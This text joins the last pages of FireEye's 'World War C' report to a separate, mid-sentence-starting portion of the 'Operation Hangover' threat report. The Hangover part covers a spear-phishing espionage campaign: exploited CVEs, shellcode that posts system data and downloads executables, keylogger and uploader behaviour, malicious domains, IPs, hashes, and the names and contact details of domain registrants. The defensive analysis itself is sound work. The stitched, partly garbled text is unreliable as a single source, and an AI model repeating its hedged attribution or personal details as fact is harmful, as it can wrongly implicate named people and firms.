 		 be angry about recent revelations of U.S. cyber spying, harness this talent for geopolitical ends?c.	Taiwan: with constant cyber attacks emanating from Mainland China, Taipei may have
 		 little choice but to react.5.Stronger focus on evasion: as we have seen, some nation-states know how to launch stealthy cyber
   attacks.But as the discipline of cyber defense matures, and as public awareness of the World War C
   phenomenon grows, some “noisy” cyber attackers such as China may be forced to raise their game
   by trying to fly under a more finely tuned radar.<footer>

FireEye, Inc.   World War C: Understanding Nation-State Motives Behind Today’s Advanced Cyber Attacks	      20
</footer>
 
   The analysis and conclusions drawn in this paper are conjectural.Cyber security, cyber espionage,
    and cyber war are new and rapidly evolving concepts.Furthermore, most computer network
    operations are shrouded in secrecy.Deception is a given.“A cyber attack, viewed outside of its geopolitical context, allows very little legal maneuvering room
    for the defending state,” said Prof. Thomas Wingfield of the Marshall Center, in a recent email interview
    with FireEye.“False flag operations and the very nature of the Internet make tactical attribution a
    losing game.”
    But Wingfield adds that strategic attribution—fusing all sources of intelligence on a potential threat—
    allows a much higher level of confidence and more options for government decision makers.“And strategic attribution begins and ends with geopolitical analysis,” he said.With this in mind, we hope that an awareness of this World War C dynamic helps cyber security
    professionals better understand, identify, and combat cyber attacks in the future.</section>


<section>
    <heading>About FireEye</heading>
    FireEye has invented a purpose-built, virtual machine-based security platform that provides real-time
    threat protection to enterprises and governments worldwide against the next generation of cyber
    attacks.These highly sophisticated cyber attacks easily circumvent traditional signature-based defenses,
    such as next-generation firewalls, IPS, anti-virus, and gateways.The FireEye Threat Prevention Platform
    provides real-time, dynamic threat protection without the use of signatures to protect an organization
    across the primary threat vectors, including Web, email, and files and across the different stages of
    an attack life cycle.The core of the FireEye platform is a virtual execution engine, complemented by
    dynamic threat intelligence, to identify and block cyber attacks in real time.FireEye has over 1,100
    customers across more than 40 countries, including over 100 of the Fortune 500.For more information on next-generation threat protection, visit www.FireEye.com
</section>


<footer>
© 2013 FireEye, Inc. All rights reserved.FireEye is a registered trademark of FireEye, Inc. All other brands, products, or service names
are or may be trademarks or service marks of their respective owners.– RPT.WWC.EN-US.092013

     FireEye, Inc.   World War C: Understanding Nation-State Motives Behind Today’s Advanced Cyber Attacks	                  21
FireEye, Inc. | 1440 McCarthy Blvd.Milpitas, CA 95035 | 408.321.6300 | 877.FIREEYE (347.3393) | info@FireEye.com | www.FireEye.com
</footer>

</doc>This infrastructure
has been in operation for at least three years, more likely close to four years.The purpose of this framework seems predominantly to be a platform for surveillance against targets of
national security interest (such as Pakistan), but we will also show how it has been used for industrial
espionage against the Norwegian telecom corporation Telenor and other civilian corporations.<figure></figure>

<caption>
The name, “Operation Hangover”, was derived from the name of one of the most frequently used malwares.The project debug
path is often visible inside executable files belonging to this family.</caption>



None of the information contained in the following report is intended to implicate any
individual or entity, or suggest inappropriate activity by any individual or entity
mentioned.<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                                         2</footer>
</section>
<section>
<heading>Background</heading>
On Sunday March 17th 2013 the Norwegian newspaper Aftenposten reported that the
telecommunications giant Telenor had filed a case with Norwegian criminal police (“KRIPOS”) over what
was perceived as an unlawful intrusion into their computer network.The infection was reported to have
been conducted via “spear phishing” emails sent to people in the upper tiers of management.Initially, we had no information or visibility into this case.However, after some time Norwegian CERT
(NorCERT) shared some data from the event, which included md5 hashes of malicious files and
information about which Command and Control servers were used.However, the data we were given acted as a starting point for more data mining, and within a short
period of time it became obvious that we were seeing a previously unknown and very extensive
infrastructure for targeted attacks.This paper is the result of the ensuing investigation.</section>
<section>

<heading>Timeframe</heading>
The samples we have uncovered seem to have been created from approximately September 2010 until
the present day.It appears 2012 was a very active year for this group, which saw escalation not only in
numbers of created malware files but also in targets.There is no sign that the attacks will slow down in
2013, as we see new attacks continuously.</section>
<section>>


<heading>Acknowledgments</heading>
We would like to thank NorCERT, the Norwegian National Security Authority, Telenor and Telenor SOC
for their assistance and cooperation during the investigation of this case.We would also like to thank
ESET for graciously sharing information they were in possession of, and finally we would like to express
our gratitude to the people who created our database and analysis systems.These systems enable us to
do the data correlation needed to find needles in haystacks, so their creators own a large part of this
paper as well.</section>

<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                          3</footer>
<section>
<heading>
Terms used
</heading>
C&C, C2, CC: Command- and Control server.Typically used about the computer the malware connects
to in order to report status.Drop:           The online location where malware delivers stolen information.FUD:          One meaning of this acronym is “Fear, Uncertainty and Doubt”, but in the malware
underground FUD means Fully UnDetectable, i.e.the program is not detected by antivirus tools.MD5:           A so-called hash – i.e.a number calculated on the basis of data that identifies these with
high confidence.MD5’s in this paper are used to identify files.RTF:            Rich Text Format, a document format

SFX:          Self-extracting.Executable programs that are also archives, and which extract and
sometimes execute the archive content when run.Sinkholing:     A technique of re-registering a domain that has previously been used for malicious
purposes.By doing this, machines that are still infected connect to our computer instead of the
attacker’s, and we can log the connection attempts.Spear phishing: To send emails with malicious content (attachments, links, or fraudulent messages) to
specific persons of particular interest.Zero day exploits: Program code to attack software vulnerabilities for which there is no patch.<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                       4</footer>
</section>
<section>
<heading>
Telenor intrusion
</heading>

Initially we had no knowledge of the malware samples involved in the attack on Telenor.However, some
days after the attack we received MD5 hashes of the samples used.We only found two of these samples
in our own datasets, but we later directly received copies of most other samples connected with the case
(Appendix A).The initial spear phishing mail contained two files as attachments – a document named “220113.doc”,
and an executable file “few important operational documents.doc.exe”.(MD5 bd52237db47ba7515b2b7220ca64704e).This was a selfextracting (SFX) ZIP archive that contained two files, as shown below.<figure></figure>
  
When run, the installer will execute the included “conhosts.exe” file and open the decoy document
“legal operations.doc”.“legal operations.doc”and “220113.doc” also included in the mail are identical
save for their size, and are actually specially crafted RTF files designed to trigger a software vulnerability
(CVE-2012-0158) in Microsoft Common Controls, typically triggered in Microsoft Word.If the
vulnerability is triggered, embedded code in the document will be run.This code is encrypted, but after
decryption its real purpose becomes visible:

<figure></figure>

<caption>
The file “windwn.exe” is downloaded and executed by this mechanism.</caption>



<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                           5</footer>
<figure></figure>
<caption>
Fig.The behaviour of windwn.exe in Norman Malware Analyzer G2.The persistence mechanism, VBScript execution and data
exfiltration is enough to trigger alerts.</caption>

The files conhosts.exe (MD5 02d6519b0330a34b72290845e7ed16ab) and windwn.exe (MD5
bfd2529e09932ac6ca18c3aaff55bd79) are both minimally obfuscated Visual Basic executables.The package is quite similar to the first, though the decoy document is this time a Powerpoint
presentation, “01084204_Telenor_New_Satellite_Client_Agreement_30032013.ppt”.This is an
apparently legitimate Telenor draft written in 2002 using a Norwegian PowerPoint installation.The included trojan downloader connects this time back to the domain torqspot.org.The attackers also created the subdomain
internet-security-suite-review.toptenreviews.com.infocardiology.biz, a spoof of the real
toptenreviews.com site.On this site there’s what appears to be an installer for the Bitdefender antivirus
product (bitdefender_tsecurity.zip, md5 62b702a15a762692eda296b0aea270f9), but the zip file contains
both a real installer and a Visual Basic trojan identical to the one used against Telenor.The Telenor-related attack seems not to be over.<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                       7</footer>
</section>
<section>
<heading>Case expansion through related files</heading>

The behaviour pattern and the file structure of known files made it possible to search internal and public
databases for similar cases.The large amount of new malware being created makes it infeasible to
conduct malware-related investigations of any scale without strong database support.In our case, we
preserve the behavioural information of all files processed by our internal bank of Norman MAG2
automatic analysis systems.<figure></figure>
<caption>
Searching internal databases for behavioural similarities: In this case, the particular VB script execution, but there’s a wealth of
attributes we can cluster by.</caption>
There are also several public and commercial databases available for additional data mining, and Google
is invaluable.The amount of malware we found through this was surprisingly large, and it became clear
that the Telenor intrusion was not a single attack but part of a continuous effort to attack and
compromise governments and corporations around the world.<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                                                     8</footer>
While investigating the extra cases we identified, we accidentally discovered that a number of their C&C
servers contained world readable folders.We were able to navigate into these and secure the data
stored there.<figure></figure>


The data contained in these folders were mainly connection logs, keylogs and other uploaded data from
computers affected with malware.Many of the collected logs were from automated analysis systems
belonging to security companies, but not all.An important find we did on these servers were additional malicious executables, probably meant to be
served to infected users.Some of these executables were digitally signed with a certificate which was
revoked in 2011:
<box>

 Technical and Commercial Consulting Pvt.Ltd.
 VeriSign Class 3 Code Signing 2010 CA
 Serial number: 4bf1d68e926e2dd8966008c44f95ea1c
 Revoked Nov 24th 2011

</box>


<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                         9</footer>
Searching our certificate databases we found a large number of other executables similarly signed, none
of which were found to be innocent applications.<figure></figure>
<caption>
Certificate database hits
</caption>



<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                   10</footer>
</section>
<section>
<heading>Case expansion through domain usage and registrations</heading>


In almost all cases, the domains registered by the attackers are “privacy protected”.This means that the
registrant has paid the domain registrar to withhold identity information related to the registration.This
is done almost to perfection.Another feature is that almost all websites belonging to this attacker has
their robots.txt set to “disallow” to stop them from being crawled.However, by searching historical IP data for the IP addresses of domains known to be involved we found
a number of other domains likely belonging to the same infrastructure.These domains were then further
verified against malware samples to ascertain valid connection to attackers.Some care needs to be taken
when working with IP addresses, as there are possibilities of false correlations on, for example, domain
parking IP addresses, sinkholes and webhosting servers.<figure></figure>
<caption>
IP history on researcherzone.net.Source: DomainTools
</caption>


<box>
..
gamezoneall.com.A           173.236.24.254
khalistancalling.com.A           173.236.24.254
rigidphotography.com.A           173.236.24.254
researcherzone.net.A           173.236.24.254
f00dlover.info.A           173.236.24.254
hotbookspot.info.A           173.236.24.254
ns1.zerodayexploits.org.A           173.236.24.254
..
</box>
<caption>
A selection of passive DNS data on just one of the known IP addresses which was known to have served malware <fn>1</fn>

</caption>



<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                                 11</footer>
Additional data may be gleaned by querying the IP addresses themselves.Many have set up a default
ESMTP (mail) server on port 587/tcp, which responds with a configured banner.For example, the domain
onlinestoreapp.net (used by malware MD5 a7b5fce4390629f1756eb25901dbe105) resolved to the IP
address 37.59.231.161, and this happens when connecting to that IP on ESMTP:
<figure>
$ telnet 37.59.231.161 587
Trying 37.59.231.161...Connected to 37.59.231.161.Escape character is '^]'.220 server.enlighten-energy.org ESMTP Exim 4.80.1 Sat, 23 Mar 2013 16:44:44 -0400

</figure>


<caption>enlighten-energy.org is another of the known bad domains used against Telenor.</caption>




All of this enabled us to draw a domain map over the infrastructure (next page).This map is probably
larger than shown here; there might be domains owned by the attackers that are not plotted on this map
because we could not prove they were malicious, and many domains we have not found yet.Conversely,
many of the domains plotted were used in attacks years ago and may never be again.<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                 12</footer>
</section>
<section>
<figure></figure>
<caption>
Above: Domain map of the attack infrastructure.Yellow and orange nodes constitute domains, where the
orange have been verified malicious and yellow are likely malicious.Blue nodes are IP addresses, and
purple are autonomous systems (AS).Green nodes are domains that are not part of any attack pattern,
but are interesting in this context.Red nodes show connections to known or likely attacks.</caption>
</section>



<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                 13</footer>
<section>
<heading>Exploits</heading>
Whereas other targeted attack actors often rely extensively on the use of software exploits to plant their
malware, this is rarely done by this attack group.As far as we can tell they are only using known
vulnerabilities; no zero day attacks.<heading>Documents</heading>
The first exploit we observed was included in the RTF files used in the Telenor attack.The exploit in
question was CVE-2012-0158, a very common vulnerability to exploit.The actual document is binary very similar to other documents (51ee31f234db61b488647915f8d7d4c8,
00978e4b81ac577f328d6add75d0890e, 17a31d1075ebce41ba48a9efacb79d28...) which have been
used in other targeted attacks by these threat actors.The shellcode contains a date check, which means it will stop working after a certain date.In the
Telenor case, the date was February 16th 2013, and in the most recent variations the timeout date is set
to May 21nd 2013.If the exploit is triggered before the timeout date the shellcode does two different
things:

    •   Posts system info (machinename, timezone, ID, running processes) to a PHP script residing on
        the website random123.site11.com.•   Downloads and executes an executable from remote sites.We have seen softmini.net,
        www.infocardiology.biz, www.getmedia.us, www.technopenta.org, and autowidge.org used for
        this.•   The executables downloaded have usually themselves been downloaders.In a couple of cases
        we have observed final payload to be Dark Comet, a well-known backdoor trojan, but unusual
        for this group to use.<heading>Web</heading>
When we investigated the attacker domain structure we found more exploit code.This time it was
implemented as a script in the main web page of the domain you-post.net.The exploit is this time CVE-
2012-4792, an Internet Explorer vulnerability.When it triggers it downloads and runs a malicious
executable from the domain softmini.net; also the domain used by two of the three documents
mentioned above.Softmini.net seems to be a hub for exploitcode; its subdomain get.adobe.flash.softmini.net contains an
active Java exploit (CVE-2012-0422) which attempts to install the same trojan as the IE exploit above.<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                       14</footer>
</section>
<section>
<heading>The Smackdown downloaders</heading>
Most of the first stage malware we’ve seen used in attacks are variants of Smackdown, a large family of
Visual Basic downloaders which for the most part seem to be written by a person calling himself “Yash”
or “Yashu”.These have evolved over time and are using different levels of obfuscation on text strings.Typically the trojan begins by uploading system information to a PHP script on the C&C server.The
attacker can decide separately which infected machine should receive additional malware.The second
stage malware is usually Hanove but other malware families are also used.<figure></figure>

<caption>Different text obfuscations in a Smackdown “miNaPro” downloader.Reversed strings, character code encoding and inserting
garbage ‘%’ characters.</caption>



<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                                         15</footer>
</section>
<section>
<heading>The HangOver malware, aka Hanove</heading>


The second stage malware are often variants of HangOver, information stealers written in C++.They
appear to be written over a common framework as many internal functions are identical, but overall
functionality can vary quite a bit from one subtype to another.The first versions of these may have been
based on code from an innocent backup utility as the word “backup” is often present.Hanove Uploaders recursively scan folders looking for files to upload.What kind of files they look for are
usually defined in resources as an extension list, and these lists vary.Here are a few examples:
<box>
 *.doc;*.xlxs;*.docx;*.rtf
 *.doc;*.xlxs;*.docx;*.rtf;*.jpg;*.ppt;*.pps;*.pdf;*.xlx
 *.doc;*.xlsx;*.docx;*.rtf;*.pdf;*.xls;*.ppt;*.txt;*.inp;*.kmz;*.pps;*.uti
</box>

Hanove keyloggers set up keyboard hooks or polls to capture keypresses and log these to a text file.Some variants capture other data as well, such as clipboard content, screenshots, titles of open windows
and content of browser edit fields.Timed events are set up to upload the data to the remote server.The stolen data are uploaded to remote servers by FTP or HTTP.The following have been seen in connection with this family:
<box>
 EMSCBVDFRT, EMSFRTCBVD, FMBVDFRESCT, DSMBVCTFRE, MBESCVDFRT, MBVDFRESCT
 TCBFRVDEMS, DEMOMAKE, DEMO, UPHTTP, sendFile
</box>


Boundary parameters vary between versions.Non-static
strings are browser UserAgent strings, MIME boundary tags, mutexes, domain names, paths, and registry
keys, which also may be obfuscated by being fragmented.Many Hanove variants use a simple rotating
encoding scheme to hide the interesting strings.For example, the domain “wearwellgarments.eu” is
hidden as “xfbsxfmmhbsnfout/fv” and the word “php” becomes “qiq”.Different variants are frequently given internal names, visible through debug paths included in the
binary.Such internal names used include “HangOver”, “Ron”, ”Dragonball”, ”Tourist”, ”Klogger”,
“FirstBlood” and “Babylon”.There are several other malwares and tools in use.See appendix C for more indicators.<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                      17</footer>
</section>
<section>
<heading>Target selection</heading>


We have direct knowledge of only one attack – the one against Telenor.During this investigation we
have obtained malware samples and decoy documents that have provided indications as to whom else
would be in the target groups.We have observed the usage of peculiar domain names that are
remarkably similar to existing legitimate domains.We have also obtained sinkhole data for a number of
domains in question and found open folders with stolen userdata in them; enough to identify targets
down to IP and machine name/domain level.This showed a geographical distribution where Pakistan
was the most affected in volume, but also showed a multitude of other countries being represented.IP counts are misleading for many reasons.One
machine can generate many IP addresses, and some IP addresses are probably lab machines.However,
the indication that Pakistan is the most prevalent target seems solid.In the following pages we’ve highlighted some of the files we have seen used to attack organizations in
different countries.As can be seen from the examples the attackers have gone to great lengths to make
the social engineering aspect as credible and applicable as possible.<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                    18</footer>
</section><section>
<heading>Pakistan</heading>
The most obvious target seems to be Pakistan.As is visible above, computers in Pakistan are by far the
most active in connecting to malicious domains.<figure>
</figure>

<caption>Pakistani soldiers praying in Karakoram.Apparent source:
http://photography.nationalgeographic.com/photography/enlarge/praying-soldiers_pod_image.html</caption>




<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                        19</footer>
</section>
<section>
<figure></figure>
<caption>Google images of the Mendhar region in India.There was a border clash there recently.http://jammu.greaterkashmir.com/news/2013/Jan/12/mendhar-incident-creates-panic-among-border-residents-29.asp</caption>
<figure></figure>



<caption>
A review of Indian future weapon acquisitions.It seems to be sourced from defence.pk
</caption>



Additional examples can be found in Appendix B.<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                              20</footer>
</section>
<section>
<heading>China</heading>
China is another country which apparently has been targeted to some extent.For example, we found a data dump and keylog seemingly harvested from a computer belonging to a
Chinese academic institution.This dump was generated in July 2012 and contains Word documents,
PowerPoint presentations and images.<figure></figure>



<caption>Uploaded archives of harvested data.</caption>

Decoys are also present, but not in the amount as is seen against Pakistani targets.<figure>
</figure>
<caption>
Chinese decoy, a scanned document named court_order.jpg.This is a notification to the family of a criminal about his jail
sentence.Language is simplified Chinese; likely mainland China.</caption>



<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                                           21</footer>
</section>
<section>
<heading>The Khalistan movement</heading>
This is a political secessionist movement aiming to create a sovereign Sikh nation in the region of Punjab
in India.Violent episodes between supporters of the Khalistan movement and government forces have
occurred through history since the movement’s creation in 1971.Examples of malware apparently aimed at the movement are md5’s
a4a2019717ce5a7d7daec8f2e1cb29f8 and f70a54aacde816cb9e9db9e9263db4aa.The former appears
to be this file: http://f00dlover.info/Khalistan/Victims_want_Sajjan_Kumar_punished.doc.zip

<figure></figure>


It is interesting to note that f00dlover.info has historically shared the IP address 173.236.24.254 with
many other domains belonging to this infrastructure – for example the domain researcherzone.net
which was used in the Telenor intrusion.There are also a number of domains with active web pages
that used to exist on this IP; for example khalistancalling.com.Khalistancalling.com has since moved on
to another bad IP (46.182.104.83) and must be considered owned by the attackers.<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                       22</footer>
</section>
<section>
<heading>The Nagaland movement</heading>
The Nagaland (or Nagalim) movement is another secessionist group aiming to create a sovereign
homeland for the Naga people living in North-Eastern India and North-Western Burma.We have seen at
least two attacks apparently aimed at them.A sample from 2010, md5 168f2c46e15c9ce0ba6e698a34a6769e, showed a scanned document which
appears to be a letter from the “President of Nagalim”.<figure></figure>


The malware sample also installed an executable which in turn connected back to the domain
zeusagency.org on the IP 176.31.65.124.Zeusagency.org has hosted different malware; one
(3105b020e2bd43924404bc4e3940191b) connected to fistoffury.net on the IP 176.31.65.126.The IP range 176.31.65.124 - 176.31.65.127 contains a series of domains used by Gimwlog and Auspo
malwares.These are somewhat different from the standard Hanove series, though functionality is
roughly equivalent.<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                  23</footer>
Another malicious installer (md5 f1799d11b34685aa209171b0a4b89d06) contained the following decoy:

<figure></figure>

<caption>
The malware included connects to the domain global-blog.net.</caption>



<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                             24</footer>
</section>
<section>
<heading>
Industrial espionage</heading>
While the Telenor case was most likely industrial espionage, we were initially unaware of other “non-
strategic/political” targets by this attack group, but during our research we discovered several related
attack files that were clearly targeting businesses.As can be seen in the example below, the social
engineering aspects are more related to business content.We want to emphasize that except in the case
of BUMI PLC, we have no information to suggest that any of the organizations named in the following
pages have been compromised.However, the available information strongly indicates that they were
targets of interests for the attackers.Likely target: Eurasian Natural Resources Corporation (ENRC)

This company which is headquartered in London has operations in multiple countries, notably in
Kazakhstan.The following malwares appear to be aimed at ENRC.</caption>



<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                    25</footer>
<heading>Known target: Bumi PLC, Indonesia</heading>


When searching for known instances of domains belonging to the attack infrastructure, we found a
published incident report made by Context Information Security <fn>2</fn>.This report details how the
Chairman of Bumi PLC, Mr Samin Tan, had been exposed to a spear-phishing attack in July 2012.Bumi is
an international mining group listed on the London Stock Exchange.<figure></figure>
<caption>

Source: Context Information Security.</caption>



Both the domains mentioned in this report have been connected to the attack group investigated.For
example, the malware executable “dua2alhycox12.exe” (c94267ba9c92f241379cdceed58777dc)
connects to hycoxcable.com, which anoniemvolmacht.com historically acted as name server for.The
latter domain has also shared IP with the malicious domain chronicleserv.org.<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                    26</footer>
Likely target: Porsche Informatik

A malware using the name “webmailapp.exe” (22a3a1d5a89866a81152cd2fc98cd6e2) is a self-extracting
archive containing several files, among them a batch file opening a shortened URL pointing to Porsche
Holding’s webmail front in Austria.Target must be assumed to be persons affiliated with Porsche.Again, we have no information as to
whether any intrusion has occurred.<figure></figure>
<caption>
The webmail front of Porsche in Austria.</caption>



<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                  27</footer>
Possible target: Restaurant industry

It appears unlikely that the restaurant and food industry should be the victim of targeted attacks.However, that’s how it appears.One indicator is the decoy file below, taken from the malicious
executable “Horsemeat_scandal_another_Irish_company_suspends_burger_production.exe“
(f52154ae1366ae889d0783730040ea85).<figure></figure>

<caption>
Guardian article about a horsemeat scandal in Ireland.Target is unknown, but file was first submitted to the VirusTotal scan
service from Great Britain.</caption>



Another indicator is the use of certain domain names, like the malicious bluebird-
restaurant.co.uk.infocardiology.biz vs the legitimate bluebird-restaurant.co.uk.The latter is a restaurant in Chelsea, UK.<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                                              28</footer>
Likely target: Chicago Mercantile Exchange

While investigating the malicious domain web-mail-services.info, we found a number of other domains
that had shared the IP address 188.95.48.99 with it.One of these domains was cmegroups.net, a spoof
of cmegroup.com; the domain belonging to Chicago Mercantile Exchange.CME is the world's largest
futures exchange company <fn>3</fn>.An entry on WIPO <fn>4</fn>, the UN arbitration body for domain name disputes, shows that a complaint
regarding this domain name was leveled by CME against PrivacyProtect.org in 2012.The complaint was
not disputed, and domain transferred to CME.However, the most interesting information is found in the
case details.<figure></figure>

<caption>
Source:wipo.net
</caption>



An interesting question is of course whether there were any attachments to this mail.<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                  29</footer>
Other suggestive domain names that have been used include:

server721-hans.de-nservers.de.continuelogs.info vs. server721-han.de-nserver.de:
The latter is the mail server for several German businesses, for example restaurants.www.alintiqad-newsonline.blogspot.com.continuelogs.info vs www.alintiqad.com:
The latter is a Lebanese newspaper in Arabic.account.istpumpenunddosiertechnik.de.continuelogs.info vs istpumpenunddosiertechnik.de:
The latter is a German producer of pumps for high-viscosity fluids.deltaairlines.com.config.services.data.sesion.24s.digitalapp.org.evitalcare.org vs deltaairlines.com:
Delta Airlines.mail.telenor.no-cookieauth.dll-getlogon-reason-0.formdir-1-curl-z2fowaz2f.infocardiology.biz vs
mail.telenor.no: Telenor
lynberrg.com vs lynberg.com: The latter belongs to Lynberg & Watkins, a US-based law firm.mail.carmel.us.exchweb.bin.auth.owalogon.asp.serviceaccountloginservicemail.info vs
mail.carmel.us: The latter is the webmail address of Carmel&Carmel, a US-based law firm.armordesigns.com.webmail-login.php.web-mail-services.info vs armordesigns.com:
The latter is a US-based manufacturer of composite materials for armor:


<figure></figure>

We do not know (yet) what purpose all these domains have, but it’s hard to imagine that the name
spoofing is done by anything but malicious intent; it is a common tactic in targeted attacks.<footer>
Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                      30</footer>
</section>
<section>
<heading>Attribution</heading>
The continued targeting of Pakistani interests and origins suggested that the attacker was of Indian
origin.<heading>
Project and debug paths
</heading>
Curiously, many of the executables we uncovered from related cases contained cleartext project and
debug path strings (see Appendix D for full list).It is not very common to find malware with debug paths,
but these particular threat actors did not seem to mind leaving such telltale signs, or maybe they were
unaware of their presence.These paths gave more indicators that the attackers were Indian.First, many
of the Visual Basic keyloggers contained the name “Yash”, which might be an abbreviation for several
Indian names.This and other text strings we initially saw gave further hints towards Indian attackers.There are many diverging project paths which points towards different persons working on separate
subprojects, but apparently not using a centralized source control system.The projects seem to be
delegated into tasks, of which some seem to follow a monthly cycle.There are hints at team structures,
like the string “VB Team Matrix Production” found in a sample (fa6d2483f766f8431b6c0a8c78178d48),
an indication that a separate team works with Visual Basic development.Some series of malware contain
strings like “delivered”, which, together with the loose project structures may indicate that development
work is being outsourced.<footer>
Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                     32</footer>
<heading>The word “Appin”.</heading>



In a great number of isolated cases and contexts, the word “Appin” shows up and there seems to be
some connection with the Indian security company called Appin Security Group.By this, we are not
implicating or suggesting inappropriate activity by Appin.Maybe someone has tried to hurt Appin by
falsifying evidence to implicate them.Maybe some rogue agent within Appin Security Group is involved,
or maybe there are other explanations.Getting to the bottom of that is beyond our visibility.For example, the strings “Appin”, “AppinSecurityGroup”, and “Matrix” are frequently found inside
executables.<footer>
Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                   33</footer>
<heading>Domain registrations
</heading>
As mentioned, the privacy-protection of domain registrations is almost perfect, but only almost.There
are a large number of domains used, and a few of these have been suspended and lost their privacy
protection.For example, the following malicious domains all used the same registration information
NITR0RAC3.COM, VALL3Y.COM, S3RV1C3S.NET, GAUZPIE.COM, BLUECREAMS.COM:
Registrant:
    NA
    Prakash        (mail@gmail.com)
    Jain
    TY-76, Kohat Enclave
    Delhi
    Delhi,110034
    IN
    Tel.+011.9873456756


Identical registration information is also used for other domains that seem unrelated to the attack
infrastructure, like hackerscouncil.com which May 12th 2011 had the following entry (source:
gwebtools.com).<figure></figure>


<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                       34</footer>
April 3th 2011, a little over a month before the registration entry above, hackerscouncil.com was
registered by Appin Technologies <fn>5</fn>.This is possibly a coincidence.HACKERSCOUNCIL.COM

Registrant:
    Appin Technologies
    Rakesh Gupta        (rakesh.gupta@appinonline.com)
    9th Floor, Metro Heights,NSP, PitamPura,
    Delhi
    Delhi,110034
    IN
    Tel.+91.1147063300


Creation Date: 17-Sep-2009
Expiration Date: 17-Sep-2011



The domain piegauz.net, which was used as a Command and Control domain for several trojan
configurations was created April 21st 2010 and had the following initial registration information:

PIEGAUZ.NET

Registrant:
    PrivacyProtect.org
    Domain Admin        (contact@privacyprotect.org)
    P.O.Box 97
    Note - All Postal Mails Rejected, visit Privacyprotect.org
    Moergestel
    null,5066 ZH
    NL
    Tel.+45.36946676



One trojan using this domain (md5 4a44b6b6463fa1a8e0515669b10bd338) was submitted to the
ThreatExpert analysis service October 28th 2010, at which time the domain was operational and accepted
uploads from the malware <fn>6</fn>.Three days later, October 31st 2010, the domain got suspended, which
removed its privacy protection:
PIEGAUZ.NET

Registrant:
    Appin Technologies
    Rakesh Gupta        (rakesh.gupta@appinonline.com)
    9th Floor, Metro Heights,NSP, PitamPura,
    Delhi
    Delhi,110034
    IN
    Tel.+91.1147063300

Creation Date: 21-Apr-2010
Expiration Date: 21-Apr-2011



The domain bluecreams.com was initially registered by Appin Security Solutions Pvt.Ltd. Sept 17th 2009.The day after it was put under privacy protection.In the period from end of June 2010 to February 2011
it was documented as download domain for several trojans <fn>7</fn>.It was suspended Apr 18th 2011 and then
displayed the already mentioned Prakash Jain as registrant.<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                    35</footer>
Another example is the domain zerodayexploits.org.This domain has a history of resolving to a series of
malicious IP addresses used for malware attacks (173.236.24.254, 8.22.200.44).This web site which
offers bounties for zeroday exploits, claims to be founded by “Appin Morpheus” and powered by Appin.<figure></figure>

<caption>
Source: bgwhois.com
</caption>
Also the live behaviour of some domains shows the word Appin.The malicious domains alr3ady.net,
wearwellgarments.eu, ezservicecenter.org, secuina.net, go-jobs.net, shoperstock.com and
maxtourguide.info inhabit the IP space 178.32.75.192 - 178.32.75.197.All these IP’s return a
recognizable ESMTP banner:
<figure>
 $ telnet 178.32.75.193 587
 Trying 178.32.75.193...Connected to 178.32.75.193.Escape character is '^]'.220 transformer13_appin ESMTP Exim 4.80.1 Sat, 23 Mar 2013 20:36:34 +0300
</figure>



<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                     36</footer>
Other interesting indicators were found when we examined the domain softservices.org; a domain which
has held several of the known malicious IP addresses used by this group (46.182.104.83, 94.185.81.153,
89.207.135.242).However, even if the domain was obviously connected, we could find no malware that
used it.Instead, we found this forum post on the Nokia developer forum:


<figure></figure>
<caption>
Developer username redacted.</caption>
The interesting bit was found further down this thread, where the developer posted a snippet of source
code:

<figure></figure>

<caption>
This piece of code appears used for uploading mobile data like IMEI number to softservices.org.</caption>
We then found the apparent developer’s profile on Elance, an online employment service for freelance
programmers.<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                     37</footer>
<figure></figure>
<caption>
The developer’s CV on Elance (name redacted).</caption>


Based on this we suspect that there are or have been projects to develop mobile malware by this group,
even if we have not found any related mobile malware in our databases.<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                   38</footer>
</section>
<section>
<heading>Mantra Tech Ventures and INNEFU</heading>
Mantra Tech Ventures is the registration service for several of the malicious domains that have been in
use.The service first came to our attention because it was used for registering the Command & Control
domains cobrapub.com, mymyntra.net, and n00b4u.com.In addition, Mantra Tech Ventures owns
abhedya.net, which seems to be a name server service for domains registered by them.Abhedya has
been used by several sites in the attack infrastructure like currentnewsstore.com, crvhostia.net,
webmicrosoftupdate.net and fuzzyfile.net.Domain Name: ABHEDYA.NET

Registrant:
    HackingTruths
    Arun Bansal        (arun@hackingtruths.org)
    *** ********* ***** *******
    ******
    Delhi,110085
    IN

